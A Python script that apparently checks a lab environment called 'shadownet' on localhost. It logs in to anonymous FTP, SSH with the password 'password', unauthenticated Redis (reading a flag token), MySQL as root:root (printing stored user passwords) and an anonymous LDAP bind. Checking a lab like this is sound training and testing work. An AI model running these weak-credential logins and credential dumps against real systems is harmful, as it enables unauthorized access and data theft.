import ftplib
import pexpect
import redis
import mysql.connector
import os

def test_ftp():
    print("\n[*] Testing FTP Anonymous Access (Port 21)...")
    try:
        ftp = ftplib.FTP('localhost')
        ftp.login('anonymous', '')
        print("[+] Success! Logged in as anonymous.")
        print("[*] Directory structure:")
        ftp.dir()
        ftp.quit()
    except Exception as e:
        print(f"[-] FTP access failed: {e}")

def test_ssh():
    print("\n[*] Testing SSH with Weak Credentials (Port 2222)...")
    try:
        # Using pexpect for ssh password handling
        child = pexpect.spawn('ssh service@localhost -p 2222')
        i = child.expect(['password:', 'continue connecting (yes/no)?'], timeout=5)
        if i == 1:
            child.sendline('yes')
            child.expect('password:')
        child.sendline('password')
        child.expect(['$', '#'], timeout=5)
        print("[+] Success! SSH access obtained for 'service' user.")
        child.sendline('cat notes.txt')
        child.expect(['$', '#'])
        print("[*] notes.txt content:")
        print(child.before.decode().strip())
        child.sendline('exit')
    except Exception as e:
        print(f"[-] SSH access failed: {e}")

def test_redis():
    print("\n[*] Testing Redis Unauthenticated Access (Port 6379)...")
    try:
        r = redis.Redis(host='localhost', port=6379, socket_connect_timeout=5)
        print(f"[+] Success! Redis connected. Ping response: {r.ping()}")
        print(f"[*] Keys found: {r.keys()}")
        if r.get('SECRET_ADMIN_TOKEN'):
            print(f"[+] Found FLAG: {r.get('SECRET_ADMIN_TOKEN').decode()}")
    except Exception as e:
        print(f"[-] Redis access failed: {e}")

def test_mysql():
    print("\n[*] Testing MySQL with Weak Credentials (Port 3306)...")
    try:
        db = mysql.connector.connect(
            host="localhost",
            user="root",
            password="root",
            database="shadownet",
            port=3306
        )
        print("[+] Success! MySQL connected with root:root.")
        cursor = db.cursor()
        cursor.execute("SELECT username, password FROM users LIMIT 5")
        print("[*] Leaked User Credentials from DB:")
        for (user, password) in cursor:
            print(f"    - {user}:{password}")
        db.close()
    except Exception as e:
        print(f"[-] MySQL access failed: {e}")

def test_ldap():
    print("\n[*] Testing LDAP Anonymous Bind (Port 389)...")
    # Using ldapsearch command for simplicity in python
    try:
        cmd = 'ldapsearch -x -H ldap://localhost:389 -b "dc=shadownet,dc=local"'
        output = os.popen(cmd).read()
        if "dn: dc=shadownet,dc=local" in output:
            print("[+] Success! LDAP Anonymous Bind worked.")
            print("[*] LDAP Records Found:")
            # Show just a few lines
            print("\n".join(output.splitlines()[:10]))
        else:
            print("[-] LDAP query failed.")
    except Exception as e:
        print(f"[-] LDAP test failed: {e}")

if __name__ == "__main__":
    test_ftp()
    test_ssh()
    test_redis()
    test_mysql()
    test_ldap()
